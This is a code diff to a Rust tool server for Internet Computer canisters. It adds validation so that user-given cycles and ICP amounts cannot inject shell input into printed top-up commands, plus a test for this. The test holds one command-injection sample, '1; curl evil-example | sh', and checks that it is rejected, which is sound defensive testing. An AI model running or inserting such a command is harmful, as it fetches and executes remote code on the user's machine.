@@ -253,7 +253,7 @@ fn default_init_arg() -> String {
 // testable without an IcTools and main.rs stays thin.
 // ===========================================================================
 
-/// Your cycles-ledger balance (the funds `icp_create_canister`/`icp_top_up_canister` spend).
+/// Your cycles-ledger balance (the funds `icp_create_canister` spends).
 pub async fn cycles_balance(ids: &Identities, session_id: &str) -> Result<CyclesBalance, String> {
     let (agent, principal) = management_agent(ids, session_id).await?;
     let ledger = parse_principal(CYCLES_LEDGER)?;
@@ -378,21 +378,26 @@ pub fn top_up_instructions(args: TopUpArgs) -> Result<TopUpInstructions, String>
     // Validate + canonicalize the id so the printed commands are copy-pastable.
     let target = parse_principal(&args.canister_id)?;
     // Substitute intended amounts into the commands where given; otherwise leave
-    // shell-style placeholders for the user to fill in.
-    let cycles = args
-        .cycles
-        .map(|c| c.to_string())
-        .unwrap_or_else(|| "<CYCLES>".to_string());
-    let icp = args
-        .icp
-        .as_deref()
-        .map(str::trim)
-        .filter(|s| !s.is_empty())
-        .map(str::to_string)
-        .unwrap_or_else(|| "<ICP_AMOUNT>".to_string());
+    // shell-style placeholders for the user to fill in. Given amounts go through
+    // the same validators the executing path used: the values are echoed into
+    // commands advertised as copy-pastable, so junk — a zero, a non-numeric
+    // string, anything smuggling shell input — is rejected, never printed. (A
+    // validated `icp` is digits with at most one dot, so it is inert in a shell.)
+    let cycles = match args.cycles {
+        Some(0) => return Err("cycles amount must be greater than 0".into()),
+        Some(c) => c.to_string(),
+        None => "<CYCLES>".to_string(),
+    };
+    let icp = match args.icp.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
+        Some(s) => {
+            parse_icp_e8s_positive(s)?;
+            s.to_string()
+        }
+        None => "<ICP_AMOUNT>".to_string(),
+    };
     let instructions = format!(
         "No top-up was performed and no funds were moved: this server does not \
-         execute top-ups (or any other funding operation) on your behalf. This \
+         execute top-ups on your behalf. This \
          tool exists for completeness — topping up canisters is an Internet \
          Computer platform capability — but the operation itself is yours to run, \
          from your own terminal:\n\
@@ -1252,6 +1257,34 @@ mod tests {
             out.instructions
         );
         assert!(out.instructions.contains("--amount <CYCLES>"), "{}", out.instructions);
+    }
+
+    // The echoed amounts are advertised as copy-pastable, so junk is rejected
+    // (never printed): a non-numeric `icp` — including a string smuggling shell
+    // input — and a zero `cycles` are errors, exactly as on the old executing
+    // path.
+    #[test]
+    fn top_up_instructions_validate_amounts() {
+        let shell = top_up_instructions(TopUpArgs {
+            canister_id: "aaaaa-aa".into(),
+            cycles: None,
+            icp: Some("1; curl evil-example | sh".into()),
+        })
+        .expect_err("shell-looking icp must be rejected");
+        assert!(shell.contains("invalid ICP amount"), "{shell}");
+        assert!(top_up_instructions(TopUpArgs {
+            canister_id: "aaaaa-aa".into(),
+            cycles: None,
+            icp: Some("abc".into()),
+        })
+        .is_err());
+        let zero = top_up_instructions(TopUpArgs {
+            canister_id: "aaaaa-aa".into(),
+            cycles: Some(0),
+            icp: None,
+        })
+        .expect_err("zero cycles must be rejected");
+        assert!(zero.contains("greater than 0"), "{zero}");
     }
 
     #[test]
